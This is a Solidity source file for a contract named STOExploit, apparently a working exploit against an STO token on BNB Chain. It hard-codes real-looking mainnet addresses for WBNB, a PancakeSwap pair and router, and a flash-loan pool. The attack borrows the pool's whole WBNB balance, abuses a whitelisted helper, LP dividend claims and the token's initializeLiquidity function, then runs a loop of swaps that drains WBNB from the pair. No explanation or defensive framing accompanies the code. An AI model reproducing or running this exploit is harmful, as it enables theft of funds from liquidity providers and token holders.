// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface ISTO {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function pendingBurnFromSell() external view returns (uint256);
    function initializeLiquidity(uint256 tokenAmount) external payable;
    function buyEnabled() external view returns (bool);
    function sellEnabled() external view returns (bool);
    function burnEnabled() external view returns (bool);
    function autoBuyThreshold() external view returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
    function removeLiquidity(
        address tokenA, address tokenB, uint256 liquidity,
        uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline
    ) external returns (uint256, uint256);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
    ) external payable;
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function token0() external view returns (address);
}

interface IMoolahPool {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface ILPDividend {
    function claim() external;
}

contract STOExploit {
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ISTO  constant STO  = ISTO(0xFE33EB082B2374ecd9Fb550f833DB88CaD8d084B);
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address constant PAIR        = 0x7c404aD6149BC69e07eCd534B9F4243Ef289bD00;
    address constant MOOLAH_POOL = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address constant LP_DIVIDEND = 0x52614E1e257F0C2fEe904B54161Ed2C22D28D2d6;
    address constant WHITELISTED_HELPER = 0x4CC42A6131B5F75739C694423bbe62110A446fea;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        uint256 flashAmount = WBNB.balanceOf(MOOLAH_POOL);
        IMoolahPool(MOOLAH_POOL).flashLoan(address(WBNB), flashAmount, "");
    }

    function onMoolahFlashLoan(uint256 amount, bytes calldata) external {
        WBNB.approve(MOOLAH_POOL, amount);
        WBNB.approve(address(ROUTER), type(uint256).max);
        WBNB.transfer(PAIR, 100000000000000);
        WBNB.withdraw(100000000000000001);
        (bool ok,) = WHITELISTED_HELPER.call{value: 100000000000000000}("");
        require(ok, "helper call failed");

        ILPDividend(LP_DIVIDEND).claim();

        uint256 lpBal = IPancakePair(PAIR).balanceOf(address(this));
        if (lpBal > 0) {
            IPancakePair(PAIR).approve(address(ROUTER), type(uint256).max);
            ROUTER.removeLiquidity(
                address(STO), address(WBNB), lpBal,
                0, 0, address(this), block.timestamp
            );
        }

        uint256 wbnbToPair = 1973358628058787612810;
        WBNB.transfer(PAIR, wbnbToPair);
        uint256 stoForLiq = STO.balanceOf(address(this));
        require(stoForLiq > 0, "no STO for initializeLiquidity");
        STO.approve(address(STO), stoForLiq);
        STO.initializeLiquidity{value: 1}(stoForLiq);
        uint256 wbnbBal = WBNB.balanceOf(address(this));
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(WBNB);
        buyPath[1] = address(STO);

        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbBal, 0, buyPath, address(this), block.timestamp
        );

        _drainLoop();
    }

    function _drainLoop() internal {
        uint256 sellAmount = 184459081028376167571127;

        for (uint256 i = 0; i < 50; i++) {
            if (STO.balanceOf(address(this)) < sellAmount) break;
            STO.transfer(PAIR, sellAmount);
            (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
            uint256 wbnbReserve = uint256(r0);
            uint256 stoReserve  = uint256(r1);

            uint256 stoBalance = STO.balanceOf(PAIR);
            if (stoBalance <= stoReserve) break;
            uint256 stoIn = stoBalance - stoReserve;
            uint256 amountOut = (stoIn * 9975 * wbnbReserve) / (stoReserve * 10000 + stoIn * 9975);
            if (amountOut == 0 || amountOut >= wbnbReserve) break;

            IPancakePair(PAIR).swap(amountOut, 0, address(this), "");
        }
    }

    receive() external payable {}
}
